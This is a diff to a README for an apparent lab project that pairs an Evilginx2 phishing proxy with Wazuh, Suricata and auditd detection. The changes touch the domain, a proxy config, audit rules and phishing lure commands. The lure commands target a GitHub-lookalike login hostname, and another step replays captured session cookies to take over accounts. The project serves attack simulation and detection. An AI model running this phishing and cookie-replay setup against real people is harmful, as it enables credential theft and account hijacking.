@@ -66,7 +66,7 @@ Both servers use key-based SSH authentication only.
 1. **Provision EC2 VPS on AWS**
    - VPS 1: t2.micro (1 GB RAM)
    - VPS 2: t2.large (8 GB RAM)
-2. **Register a Domain on Namecheap**
+2. **Register a Domain on Namecheap (blakkhcloud.com)**
 3. **Configure DNS records (A, CNAME) using AWS Hosted Zones**
 
 ### Phase 2: Evilginx2 & Dante Setup on VPS 1
@@ -109,7 +109,7 @@ Paste this config:
 ```conf
 logoutput: /var/log/danted.log
 internal: 0.0.0.0 port = 1080
-external: eth0
+external: enX0
 method: username none
 user.notprivileged: nobody
 client pass {
@@ -175,6 +175,8 @@ Set:
 ```xml
 <logall>yes</logall>
 <enabled>yes</enabled>
+
+# Then add this to   <!-- <active-response> active-response options here</active-response> -->
 <active-response>
   <command>firewall-drop</command>
   <location>local</location>
@@ -222,6 +224,7 @@ Edit `/etc/suricata/suricata.yaml` → Set HOME\_NET and EXTERNAL\_NET, and poin
 3. **Edit ossec.conf:**
 
 ```xml
+# Add this towards the ending of the file for suricata log format
 <localfile>
   <log_format>json</log_format>
   <location>/var/log/suricata/eve.json</location>
@@ -238,6 +241,7 @@ sudo nano /etc/audit/audit.rules
 Add:
 
 ```bash
+-a exit,always -F arch=b32 -S execve -k audit-wazuh-c
 -a exit,always -F arch=b64 -S execve -k audit-wazuh-c
 -a always,exit -F path=/home/ubuntu/evilginx2 -F perm=x -k evilginx_exec
 ```
@@ -255,6 +259,8 @@ sudo augenrules --load
 
 ```bash
 lures create github
+# Then check for lure id
+lures
 lures edit <id> path /login
 lures edit <id> hostname github.blakkhcloud.com
 lures get-url <id>
@@ -267,7 +273,7 @@ sessions
 sessions <id>
 ```
 
-3. **Replay Attack:** Use `EditThisCookie` to import session cookies and gain access to accounts.
+3. **Replay Attack:** Use `EditThisCookie` extension to import session cookies and gain access to accounts.
 
 ---
 
@@ -304,12 +310,13 @@ sessions <id>
 
 ## 9. Project Deliverables
 
-- ✅ Evilginx phishlet templates
-- ✅ Custom Wazuh detection rules
-- ✅ Audit.rules for AuditD
-- ✅ Dante SOCKS5 proxy config (`danted.conf`)
-- ✅ `ossec.conf` templates for Wazuh Manager & Agent
-- ✅ Full setup + attack simulation guide (this file)
+-  Evilginx phishlet templates
+-  Custom Wazuh detection rules
+-  Audit.rules for AuditD
+-  Dante SOCKS5 proxy config (`danted.conf`)
+-  `ossec.conf` templates for Wazuh Manager & Agent
+-  Project/execution emages in assets folder
+-  Full setup + attack simulation guide (this file)
 
 ---
 
